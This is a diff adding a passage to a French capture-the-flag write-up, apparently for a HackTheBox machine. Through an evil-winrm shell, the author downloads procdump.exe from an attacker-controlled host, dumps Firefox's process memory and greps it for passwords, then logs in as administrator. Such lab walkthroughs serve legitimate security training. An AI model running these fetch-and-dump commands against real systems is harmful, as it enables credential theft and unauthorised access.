@@ -52,3 +52,13 @@ evil-winrm > ./winPEASx64.exe all
 ```
 Dans l'énumération, winPEAS nous dit qu'il y a du mot de passe d'enregistré dans Firefox :</br>
 ![Pic13](../img/heist13.PNG?raw=true) </br>
+Nous allons voir si Firefox est actif et le dumper pour voir si il contient un mot de passe autre que le notre :
+```bash
+evil-winrm > powershell -c "Invoke-Webrequest -Uri http://10.10.14.6:8000/procdump.exe -outfile procdump.exe"
+evil-winrm > Get-Process
+evil-winrm > ./procdump -ma 708
+evil-winrm > powershell -c 'Get-Content firefox_dump.dmp | Select-string -Pattern "assword" '
+```
+![Pic14](../img/heist14.PNG?raw=true) </br>
+Nous pouvons alors nous connecter en administrator et récupérer le root.txt :</br>
+![Pic15](../img/heist15.PNG?raw=true) </br>
